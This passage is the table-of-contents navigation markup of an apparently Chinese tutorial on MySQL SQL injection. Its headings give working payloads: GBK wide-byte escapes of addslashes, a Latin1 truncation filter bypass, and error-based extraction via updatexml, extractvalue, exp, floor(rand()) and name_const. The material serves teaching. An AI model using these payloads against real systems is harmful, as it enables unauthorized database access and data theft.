class="nav-item nav-level-6"><a class="nav-link" href="#这使得我们原本的payload被转义成如下："><span class="nav-number">2.2.1.4.</span> <span class="nav-text">这使得我们原本的payload被转义成如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注意：我们输入的单引号被转义掉了，此时SQL语句的功能是：查找用户名为admin-39-且密码为123的用户。"><span class="nav-number">2.2.1.5.</span> <span class="nav-text">注意：我们输入的单引号被转义掉了，此时SQL语句的功能是：查找用户名为admin&#39;#且密码为123的用户。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是我们注意到，在拼接SQL语句并与数据库进行通信之前，我们执行了这么一条语句："><span class="nav-number">2.2.1.6.</span> <span class="nav-text">但是我们注意到，在拼接SQL语句并与数据库进行通信之前，我们执行了这么一条语句：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其作用相当于："><span class="nav-number">2.2.1.7.</span> <span class="nav-text">其作用相当于：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#当我们输入的数据为：username-df-27or-201-1-23-amp-password-123"><span class="nav-number">2.2.1.8.</span> <span class="nav-text">当我们输入的数据为：username=%df%27or%201=1%23&amp;password=123</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#经过addslashes函数处理最终变成：username-df-5c-27or-201-1-23-amp-password-123"><span class="nav-number">2.2.1.9.</span> <span class="nav-text">经过addslashes函数处理最终变成：username=%df%5c%27or%201=1%23&amp;password=123</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#经过gbk解码得到：username-運-39-or-1-1-、password-123，拼接到SQL语句得："><span class="nav-number">2.2.1.10.</span> <span class="nav-text">经过gbk解码得到：username=運&#39;or 1=1#、password=123，拼接到SQL语句得：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#成功跳出了addslashes的转义限制。"><span class="nav-number">2.2.1.11.</span> <span class="nav-text">成功跳出了addslashes的转义限制。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#具体解释"><span class="nav-number">2.2.1.12.</span> <span class="nav-text">具体解释</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#前边提到：set-names-39-gbk-39-相当于执行了如下操作："><span class="nav-number">2.2.1.13.</span> <span class="nav-text">前边提到：set names &#39;gbk&#39;;相当于执行了如下操作：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#那么此时在SQL语句在与数据库进行通信时，会先将SQL语句进行对应的character-set-client所设置的编码进行转码，本例是gbk编码。"><span class="nav-number">2.2.1.14.</span> <span class="nav-text">那么此时在SQL语句在与数据库进行通信时，会先将SQL语句进行对应的character_set_client所设置的编码进行转码，本例是gbk编码。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由于PHP的编码为UTF-8，我们输入的内容为-df-27，会被当做是两个字符，其中-27为单引号-39-。"><span class="nav-number">2.2.1.15.</span> <span class="nav-text">由于PHP的编码为UTF-8，我们输入的内容为%df%27，会被当做是两个字符，其中%27为单引号&#39;。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#经过函数addslashes处理变成-df-5c-27，-5c为反斜线-。"><span class="nav-number">2.2.1.16.</span> <span class="nav-text">经过函数addslashes处理变成%df%5c%27，%5c为反斜线\。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在经过客户端层character-set-client编码处理后变成：運-39-，成功将反斜线给“吞”掉了，使单引号逃逸出来。"><span class="nav-number">2.2.1.17.</span> <span class="nav-text">在经过客户端层character_set_client编码处理后变成：運&#39;，成功将反斜线给“吞”掉了，使单引号逃逸出来。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-Latin1默认编码"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.Latin1默认编码</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#接下来我们就讲一讲latin1造成的编码问题。"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">接下来我们就讲一讲latin1造成的编码问题。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-4"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#建表语句如下："><span class="nav-number">2.2.2.3.</span> <span class="nav-text">建表语句如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们设置表的编码为latin1，事实上，就算你不填写，默认编码便是latin1。"><span class="nav-number">2.2.2.4.</span> <span class="nav-text">我们设置表的编码为latin1，事实上，就算你不填写，默认编码便是latin1。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们往表中添加一条数据：insert-table1-VALUES-1-39-admin-39-39-admin-39"><span class="nav-number">2.2.2.5.</span> <span class="nav-text">我们往表中添加一条数据：insert table1 VALUES(1,&#39;admin&#39;,&#39;admin&#39;);</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注意查看源代码："><span class="nav-number">2.2.2.6.</span> <span class="nav-text">注意查看源代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们对用户的输入进行了判断，若输入内容为admin，直接结束代码输出返回，并且还对输入的内容进行addslashes处理，使得我们无法逃逸出单引号。"><span class="nav-number">2.2.2.7.</span> <span class="nav-text">我们对用户的输入进行了判断，若输入内容为admin，直接结束代码输出返回，并且还对输入的内容进行addslashes处理，使得我们无法逃逸出单引号。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这样的话，我们该怎样绕过这个限制，让页面输出admin的数据呢？"><span class="nav-number">2.2.2.8.</span> <span class="nav-text">这样的话，我们该怎样绕过这个限制，让页面输出admin的数据呢？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们注意到：-mysqli-gt-query-quot-set-names-utf8-quot-这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。"><span class="nav-number">2.2.2.9.</span> <span class="nav-text">我们注意到：$mysqli-&gt;query(&quot;set names utf8&quot;);这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上边在gbk宽字节注入的时候讲到过：set-names-utf8-相当于："><span class="nav-number">2.2.2.10.</span> <span class="nav-text">上边在gbk宽字节注入的时候讲到过：set names utf8;相当于：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#前边说道：PHP的编码是UTF-8，而我们现在设置的也是UTF-8，怎么会产生问题呢？"><span class="nav-number">2.2.2.11.</span> <span class="nav-text">前边说道：PHP的编码是UTF-8，而我们现在设置的也是UTF-8，怎么会产生问题呢？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#前边我们提到：SQL语句会先转成character-set-client设置的编码。但，他接下来还会继续转换。character-set-client客户端层转换完毕之后，数据将会交给character-set-connection连接层处理，最后在从character-set-connection转到数据表的内部操作字符集。"><span class="nav-number">2.2.2.12.</span> <span class="nav-text">前边我们提到：SQL语句会先转成character_set_client设置的编码。但，他接下来还会继续转换。character_set_client客户端层转换完毕之后，数据将会交给character_set_connection连接层处理，最后在从character_set_connection转到数据表的内部操作字符集。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#来本例中，字符集的转换为：UTF-8—-gt-UTF-8-gt-Latin1"><span class="nav-number">2.2.2.13.</span> <span class="nav-text">来本例中，字符集的转换为：UTF-8—&gt;UTF-8-&gt;Latin1</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里需要讲一下UTF-8编码的一些内容。"><span class="nav-number">2.2.2.14.</span> <span class="nav-text">这里需要讲一下UTF-8编码的一些内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#UTF-8编码是变长编码，可能有1-4个字节表示："><span class="nav-number">2.2.2.15.</span> <span class="nav-text">UTF-8编码是变长编码，可能有1~4个字节表示：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#一字节时范围是-00-7F"><span class="nav-number">2.2.2.16.</span> <span class="nav-text">一字节时范围是[00-7F]</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#两字节时范围是-C0-DF-80-BF"><span class="nav-number">2.2.2.17.</span> <span class="nav-text">两字节时范围是[C0-DF][80-BF]</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#三字节时范围是-E0-EF-80-BF-80-BF"><span class="nav-number">2.2.2.18.</span> <span class="nav-text">三字节时范围是[E0-EF][80-BF][80-BF]</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#四字节时范围是-F0-F7-80-BF-80-BF-80-BF"><span class="nav-number">2.2.2.19.</span> <span class="nav-text">四字节时范围是[F0-F7][80-BF][80-BF][80-BF]</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#然后根据RFC-3629规范，又有一些字节值是不允许出现在UTF-8编码中的："><span class="nav-number">2.2.2.20.</span> <span class="nav-text">然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中的：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。"><span class="nav-number">2.2.2.21.</span> <span class="nav-text">所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#关于所有的UTF-8字符，你可以在这个表中一一看到：http-utf8-chartable-de-unicode-utf8-table-pl"><span class="nav-number">2.2.2.22.</span> <span class="nav-text">关于所有的UTF-8字符，你可以在这个表中一一看到：http://utf8-chartable.de/unicode-utf8-table.pl</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#引自：Mysql字符编码利用技巧"><span class="nav-number">2.2.2.23.</span> <span class="nav-text">引自：Mysql字符编码利用技巧</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#利用这一特性，我们输入：-username-admin-c2，-c2是一个Latin1字符集不存在的字符。"><span class="nav-number">2.2.2.24.</span> <span class="nav-text">利用这一特性，我们输入：?username=admin%c2，%c2是一个Latin1字符集不存在的字符。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由上述，可以简单的知道：-00-7F可以直接表示某个字符、-C2-F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。"><span class="nav-number">2.2.2.25.</span> <span class="nav-text">由上述，可以简单的知道：%00-%7F可以直接表示某个字符、%C2-%F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：00-7F、C2-EF。"><span class="nav-number">2.2.2.26.</span> <span class="nav-text">但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：00-7F、C2-EF。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。"><span class="nav-number">2.2.2.27.</span> <span class="nav-text">而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#利用这一特性，我们的payload为-username-admin-c2，此处的-c2换为-c2-ef均可。"><span class="nav-number">2.2.2.28.</span> <span class="nav-text">利用这一特性，我们的payload为?username=admin%c2，此处的%c2换为%c2-%ef均可。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因为admin-c2在最后一层的内部操作字符集转换中变成admin。"><span class="nav-number">2.2.2.29.</span> <span class="nav-text">因为admin%c2在最后一层的内部操作字符集转换中变成admin。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-报错注入原理"><span class="nav-number">2.3.</span> <span class="nav-text">0x06.报错注入原理</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。"><span class="nav-number">2.3.0.1.</span> <span class="nav-text">我们前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#那么，我们具体来说说，都有哪些特殊函数，以及他们都该怎么使用。"><span class="nav-number">2.3.0.2.</span> <span class="nav-text">那么，我们具体来说说，都有哪些特殊函数，以及他们都该怎么使用。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类："><span class="nav-number">2.3.0.3.</span> <span class="nav-text">MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-exp"><span class="nav-number">2.3.1.</span> <span class="nav-text">1.exp()</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#函数语法：exp-int"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">函数语法：exp(int)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#适用版本：5-5-5-5-5-49"><span class="nav-number">2.3.1.2.</span> <span class="nav-text">适用版本：5.5.5~5.5.49</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#该函数将会返回e的x次方结果，例如："><span class="nav-number">2.3.1.3.</span> <span class="nav-text">该函数将会返回e的x次方结果，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#为什么会报错呢？我们知道，次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。例如："><span class="nav-number">2.3.1.4.</span> <span class="nav-text">为什么会报错呢？我们知道，次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们的payload为：exp-select-from-select-user-a"><span class="nav-number">2.3.1.5.</span> <span class="nav-text">我们的payload为：exp(~(select * from(select user())a))</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其中，-符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出。"><span class="nav-number">2.3.1.6.</span> <span class="nav-text">其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#除了exp-之外，还有类似pow-之类的相似函数同样是可利用的，他们的原理相同。"><span class="nav-number">2.3.1.7.</span> <span class="nav-text">除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-updatexml"><span class="nav-number">2.3.2.</span> <span class="nav-text">2.updatexml()</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#函数语法：updatexml-XML-document-XPath-string-new-value"><span class="nav-number">2.3.2.1.</span> <span class="nav-text">函数语法：updatexml(XML_document, XPath_string, new_value);</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#适用版本-5-1-5"><span class="nav-number">2.3.2.2.</span> <span class="nav-text">适用版本: 5.1.5+</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们通常在第二个xpath参数填写我们要查询的内容。"><span class="nav-number">2.3.2.3.</span> <span class="nav-text">我们通常在第二个xpath参数填写我们要查询的内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#与exp-不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。"><span class="nav-number">2.3.2.4.</span> <span class="nav-text">与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload-updatexml-1-concat-0x7e-select-user-0x7e-1"><span class="nav-number">2.3.2.5.</span> <span class="nav-text">payload: updatexml(1,concat(0x7e,(select user()),0x7e),1)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#前后添加-0x7e-使其不符合xpath格式从而报错。例如："><span class="nav-number">2.3.2.6.</span> <span class="nav-text">前后添加~(0x7e)使其不符合xpath格式从而报错。例如：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-extractvalue"><span class="nav-number">2.3.3.</span> <span class="nav-text">3.extractvalue()</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#函数语法：EXTRACTVALUE-XML-document-XPath-string"><span class="nav-number">2.3.3.1.</span> <span class="nav-text">函数语法：EXTRACTVALUE (XML_document, XPath_string);</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#适用版本：5-1-5"><span class="nav-number">2.3.3.2.</span> <span class="nav-text">适用版本：5.1.5+</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#利用原理与updatexml函数相同"><span class="nav-number">2.3.3.3.</span> <span class="nav-text">利用原理与updatexml函数相同</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload-and-extractvalue-1-concat-0x7e-select-user-0x7e"><span class="nav-number">2.3.3.4.</span> <span class="nav-text">payload: and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-5"><span class="nav-number">2.3.3.5.</span> <span class="nav-text">例如：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-rand-group-count"><span class="nav-number">2.3.4.</span> <span class="nav-text">4.rand()+group()+count()</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故rand-不能后接在order-group-by上。"><span class="nav-number">2.3.4.1.</span> <span class="nav-text">虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故rand()不能后接在order/group by上。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#举一个例子：假设user表有三条数据，我们通过：select-from-user-group-by-username来通过其中的username字段进行分组。"><span class="nav-number">2.3.4.2.</span> <span class="nav-text">举一个例子：假设user表有三条数据，我们通过：select * from user group by username来通过其中的username字段进行分组。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#此过程会先建立一个虚拟表，存在两个字段：key，count"><span class="nav-number">2.3.4.3.</span> <span class="nav-text">此过程会先建立一个虚拟表，存在两个字段：key，count</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其中我们通过username来判断，其在此处是字段，首先先取第一行的数据：username-test-amp-password-test"><span class="nav-number">2.3.4.4.</span> <span class="nav-text">其中我们通过username来判断，其在此处是字段，首先先取第一行的数据：username=test&amp;password=test</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#username为test出现一次，则现在虚表内查询是否存在test，若存在，则count-1，若不存在，则添加test，其count为1。"><span class="nav-number">2.3.4.5.</span> <span class="nav-text">username为test出现一次，则现在虚表内查询是否存在test，若存在，则count+1，若不存在，则添加test，其count为1。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于floor-rand-0-2-，其中rand-函数，会生成0-1之间随机一个小数、floor-取整数部分、0是随机因子、乘2是为了让大于0-5的小数通过floor函数得1，否则永远为0。"><span class="nav-number">2.3.4.6.</span> <span class="nav-text">对于floor(rand(0)*2)，其中rand()函数，会生成0~1之间随机一个小数、floor()取整数部分、0是随机因子、乘2是为了让大于0.5的小数通过floor函数得1，否则永远为0。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#若表中有三行数据：我们通过select-from-user-group-by-floor-rand-0-2-进行排序的话。"><span class="nav-number">2.3.4.7.</span> <span class="nav-text">若表中有三行数据：我们通过select * from user group by floor(rand(0)*2)进行排序的话。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注意，由于rand-0-的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011…"><span class="nav-number">2.3.4.8.</span> <span class="nav-text">注意，由于rand(0)的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011…</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先group-by需要执行的话，需要确定分组因子，故floor-rand-0-2-被执行一次，得到的结果为0，接着在虚表内检索0，发现虚表没有键值为0的记录，故添加上，在进行添加时：floor-rand-0-2-第二次被执行，得到结果1，故虚表插入的内容为key-1-amp-count-1。"><span class="nav-number">2.3.4.9.</span> <span class="nav-text">首先group by需要执行的话，需要确定分组因子，故floor(rand(0)*2)被执行一次，得到的结果为0，接着在虚表内检索0，发现虚表没有键值为0的记录，故添加上，在进行添加时：floor(rand(0)*2)第二次被执行，得到结果1，故虚表插入的内容为key=1&amp;count=1。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第二次执行group-by时：floor-rand-0-2-先被运行一次，也就是第三次运行。得到结果1，查询虚表发现数据存在，因而直接让虚表内的key-1的count加一即可，floor-只运行了一次。"><span class="nav-number">2.3.4.10.</span> <span class="nav-text">第二次执行group by时：floor(rand(0)*2)先被运行一次，也就是第三次运行。得到结果1，查询虚表发现数据存在，因而直接让虚表内的key=1的count加一即可，floor(..)只运行了一次。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第三次执行group-by时，floor被执行第四次，得到结果0，查询虚表不存在。再插入虚表时，floor-…-被执行第五次，得到结果1，故此时虚表将插入的值为key-1-amp-count-1，注意，此时虚表已有一条记录为：key-1-amp-count-2，并且字段key为主键，具有不可重复性，故虚表在尝试插入时将产生错误。"><span class="nav-number">2.3.4.11.</span> <span class="nav-text">第三次执行group by时，floor被执行第四次，得到结果0，查询虚表不存在。再插入虚表时，floor(…)被执行第五次，得到结果1，故此时虚表将插入的值为key=1&amp;count=1，注意，此时虚表已有一条记录为：key=1&amp;count=2，并且字段key为主键，具有不可重复性，故虚表在尝试插入时将产生错误。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#图文如下："><span class="nav-number">2.3.4.12.</span> <span class="nav-text">图文如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-查询前默认会建立空虚拟表如下图"><span class="nav-number">2.3.4.13.</span> <span class="nav-text">1.查询前默认会建立空虚拟表如下图:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-取第一条记录，执行floor-rand-0-2-，发现结果为0-第一次计算-查询虚拟表，发现0的键值不存在，则floor-rand-0-2-会被再计算一次，结果为1-第二次计算-，插入虚表，这时第一条记录查询完毕，如下图"><span class="nav-number">2.3.4.14.</span> <span class="nav-text">2.取第一条记录，执行floor(rand(0)2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-查询第二条记录，再次计算floor-rand-0-2-，发现结果为1-第三次计算-，查询虚表，发现1的键值存在，所以floor-rand-0-2-不会被计算第二次，直接count-加1，第二条记录查询完毕，结果如下"><span class="nav-number">2.3.4.15.</span> <span class="nav-text">3.查询第二条记录，再次计算floor(rand(0)2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕，结果如下:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-查询第三条记录，再次计算floor-rand-0-2-，发现结果为0-第4次计算-，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor-rand-0-2-被再次计算，作为虚表的主键，其值为1-第5次计算-，然而1这个主键已经存在于虚拟表中，而新计算的值也为1-主键键值必须唯一-，所以插入的时候就直接报错了。"><span class="nav-number">2.3.4.16.</span> <span class="nav-text">4.查询第三条记录，再次计算floor(rand(0)2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-整个查询过程floor-rand-0-2-被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。"><span class="nav-number">2.3.4.17.</span> <span class="nav-text">5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#引自：——Mysql报错注入原理分析-count-、rand-、group-by"><span class="nav-number">2.3.4.18.</span> <span class="nav-text">引自：——Mysql报错注入原理分析(count()、rand()、group by)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload用法-union-select-count-2-concat-39-39-select-database-39-39-floor-rand-2-as-a-from-information-schema-tables-group-by-a"><span class="nav-number">2.3.4.19.</span> <span class="nav-text">payload用法: union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-几何函数"><span class="nav-number">2.3.5.</span> <span class="nav-text">5.几何函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-不存在的函数"><span class="nav-number">2.3.6.</span> <span class="nav-text">6.不存在的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。例如："><span class="nav-number">2.3.6.1.</span> <span class="nav-text">随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。例如：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-Bigint数值操作："><span class="nav-number">2.3.7.</span> <span class="nav-text">7.Bigint数值操作：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#当mysql数据库的某些边界数值进行数值运算时，会报错的原理。"><span class="nav-number">2.3.7.1.</span> <span class="nav-text">当mysql数据库的某些边界数值进行数值运算时，会报错的原理。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如-0得到的结果：18446744073709551615"><span class="nav-number">2.3.7.2.</span> <span class="nav-text">如~0得到的结果：18446744073709551615</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#若此数参与运算，则很容易会错误。"><span class="nav-number">2.3.7.3.</span> <span class="nav-text">若此数参与运算，则很容易会错误。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload-select-select-from-select-user-a-0"><span class="nav-number">2.3.7.4.</span> <span class="nav-text">payload: select !(select * from(select user())a)-~0;</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-name-const"><span class="nav-number">2.3.8.</span> <span class="nav-text">8.name_const()</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#仅可取数据库版本信息"><span class="nav-number">2.3.8.1.</span> <span class="nav-text">仅可取数据库版本信息</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload-select-from-select-name-const-version-0x1-name-const-version-0x1-a"><span class="nav-number">2.3.8.2.</span> <span class="nav-text">payload: select * from(select name_const(version(),0x1),name_const(version(),0x1))a</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#9-uuid相关函数"><span class="nav-number">2.3.9.</span> <span class="nav-text">9.uuid相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#适用版本：8-0-x"><span class="nav-number">2.3.9.1.</span> <span class="nav-text">适用版本：8.0.x</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参数格式不正确。"><span class="nav-number">2.3.9.2.</span> <span class="nav-text">参数格式不正确。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-join-using-注列名"><span class="nav-number">2.3.10.</span> <span class="nav-text">10.join using()注列名</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#通过系统关键词join可建立两个表之间的内连接。"><span class="nav-number">2.3.10.1.</span> <span class="nav-text">通过系统关键词join可建立两个表之间的内连接。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因-相同列名存在-，而发生错误。"><span class="nav-number">2.3.10.2.</span> <span class="nav-text">通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#并且报错信息会存在重复的列名，可以使用-USING-表达式声明内连接（INNER-JOIN）条件来避免报错。"><span class="nav-number">2.3.10.3.</span> <span class="nav-text">并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#11-GTID相关函数"><span class="nav-number">2.3.11.</span> <span class="nav-text">11.GTID相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#参数格式不正确。-1"><span class="nav-number">2.3.11.1.</span> <span class="nav-text">参数格式不正确。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-6"><span class="nav-number">2.3.11.2.</span> <span class="nav-text">例如：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#12-报错函数速查表"><span class="nav-number">2.3.12.</span> <span class="nav-text">12.报错函数速查表</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#注：默认MYSQL-ERRMSG-SIZE-512"><span class="nav-number">2.3.12.1.</span> <span class="nav-text">注：默认MYSQL_ERRMSG_SIZE=512</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#摘自——Mysql-注入基础小结"><span 